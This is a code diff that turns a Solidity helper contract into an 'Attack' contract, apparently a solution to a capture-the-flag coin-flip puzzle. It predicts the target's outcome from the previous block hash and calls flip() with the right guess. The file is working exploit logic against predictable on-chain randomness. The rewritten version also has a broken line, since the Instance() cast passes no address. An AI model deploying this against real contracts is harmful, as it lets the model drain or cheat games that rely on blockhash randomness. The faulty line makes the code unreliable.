@@ -1,37 +1,28 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.13;
+pragma solidity ^0.8.20;
 
-import 'SafeMath.sol';
-
-interface CoinFlip{
-    function flip(bool) external returns(bool);
+interface Instance {
+    function flip(bool) external returns (bool);
 }
 
-contract test {
-
-    using SafeMath for uint256;
-    uint256 lastHash;
+contract Attack {
+    Instance instance = Instance();
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-    address level;
+    uint256 blockValue;
+    uint256 lastHash;
 
-    constructor(address _level) {
-        level = _level;
-    }
-
-    function flip() public  {
-        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
-
+    function attack() public {
+        blockValue = uint256(blockhash(block.number - 1));
         if (lastHash == blockValue) {
-        revert();
+            revert();
         }
 
         lastHash = blockValue;
-        uint256 coin = blockValue.div(FACTOR);
+        uint256 coin = blockValue / FACTOR;
 
         if(coin == 1)
-            CoinFlip(level).flip(true);
+            instance.flip(true);
         else
-            CoinFlip(level).flip(false);
-
-  }
+            instance.flip(false);
+    }
 }
